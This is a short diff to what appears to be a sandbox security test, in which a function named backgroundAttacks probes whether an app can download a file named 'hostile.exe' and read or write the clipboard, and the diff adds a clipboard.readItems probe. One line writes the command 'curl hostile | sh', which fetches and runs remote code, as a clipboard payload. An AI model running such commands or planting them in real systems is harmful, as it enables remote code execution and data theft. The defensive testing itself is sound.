@@ -175,6 +175,9 @@ async function backgroundAttacks(app, exfil) {
     raw("download", [new Blob(["hostile"]), "hostile.exe"]),
   );
   r["shell.clipboard-read"] = await attempt(() => raw("clipboard.read"));
+  r["shell.clipboard-read-items"] = await attempt(() =>
+    raw("clipboard.readItems"),
+  );
   r["shell.clipboard-write"] = await attempt(() =>
     raw("clipboard.write", ["curl hostile | sh"]),
   );
